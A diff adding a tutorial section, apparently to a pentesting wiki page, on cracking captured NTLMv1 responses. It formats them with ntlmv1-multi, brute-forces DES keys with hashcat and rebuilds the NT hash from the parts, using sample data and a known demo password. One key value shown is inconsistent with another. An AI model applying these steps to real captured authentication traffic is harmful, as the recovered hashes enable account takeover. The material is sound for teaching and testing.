@@ -92,6 +92,84 @@ _Note that for this technique the authentication must be performed using NTLMv1 
 
 Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).
 
+### NTLMv1 attack with hashcat
+
+NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
+
+The command
+```
+python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
+``` would output the below:
+
+```
+['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
+
+Hostname: DUSTIN-5AA37877
+Username: hashcat
+Challenge: 1122334455667788
+LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
+NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
+CT1: 727B4E35F947129E
+CT2: A52B9CDEDAE86934
+CT3: BB23EF89F50FC595
+
+To Calculate final 4 characters of NTLM hash use:
+./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
+
+To crack with hashcat create a file with the following contents:
+727B4E35F947129E:1122334455667788
+A52B9CDEDAE86934:1122334455667788
+
+To crack with hashcat:
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+
+To Crack with crack.sh use the following token
+NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
+```
+
+Create a file with the contents of:
+```
+727B4E35F947129E:1122334455667788
+A52B9CDEDAE86934:1122334455667788
+```
+
+Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
+
+```
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+```
+
+In this case we know the password to this is password so we are going to cheat for demo purposes:
+```
+python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
+DESKEY1: b55d6d04e67926
+DESKEY2: bcba83e6895b9d
+
+echo b55d6d04e67926>>des.cand
+echo bcba83e6895b9d>>des.cand
+```
+
+We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
+```
+./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
+b4b9b02e6f09a9 # this is part 1
+
+./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
+bd760f388b6700 # this is part 2
+```
+
+finally the last part
+```
+./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
+
+586c # this is the last part
+```
+
+combine them together
+```
+NTHASH=b4b9b02e6f09a9bd760f388b6700586c
+```
+
 ### NTLMv2 Challenge
 
 The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
